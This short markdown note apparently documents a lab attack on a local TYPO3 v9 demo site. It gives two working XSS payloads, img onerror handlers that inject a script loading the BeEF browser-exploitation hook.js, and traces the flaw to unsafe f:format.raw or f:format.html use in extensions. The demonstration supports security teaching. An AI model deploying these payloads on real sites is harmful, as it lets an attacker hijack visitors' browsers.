# Just BeEF

## Attack

http://typo3v9-hack.ddev.site/index.php?id=84

* the payload of BeEF to be executed

```
http://typo3v9-hack.ddev.site:3000/hook.js
```

* 1st attempt

```
Great!<img src="great" onerror="quot=String.fromCharCode(34);document.write('<script src='+quot+'http://typo3v9-hack.ddev.site:3000/hook.js'+quot+'></script>')">
```

* 2nd attempts

```
Great!<img src="great" style="display:none" onerror="script=document.createElement('script');script.src= 'http://typo3v9-hack.ddev.site:3000/hook.js';document.body.append(script);">
```

## Security Vulnerability

This attack relies on some insecure extension implementation that either using `<f:format.raw>` or
`<f:format.html>` in order to make use of insecure markup.